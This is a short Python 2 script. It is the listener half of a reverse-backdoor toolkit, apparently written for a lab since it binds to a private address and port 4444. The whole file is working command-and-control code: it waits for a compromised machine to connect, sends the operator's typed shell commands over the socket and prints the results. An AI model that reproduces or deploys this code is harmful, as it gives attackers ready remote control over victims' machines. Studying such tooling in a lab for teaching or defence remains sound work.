#! /usr/bin/env python
# NOTICE: This script is used as a listener for 'reverse_backdoor.py' script.
# Compatibility: Python 2 only. For now.

import json
import socket


class Listener:
    def __init__(self, ip_address, port):
        listener_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener_socket.bind((ip_address, port))
        listener_socket.listen(0)
        print("[+] Waiting for incoming connection...")
        self.connection, address = listener_socket.accept()
        print("[+] Connection established! Source: " + str(address))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data += self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self, command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.connection.close()
            exit()
        return self.reliable_receive()

    def run(self):
        while True:
            command = raw_input(" >> ")
            command = command.split()
            result = self.execute_remotely(command)
            print(result)


listener = Listener("10.0.2.15", 4444)
listener.run()
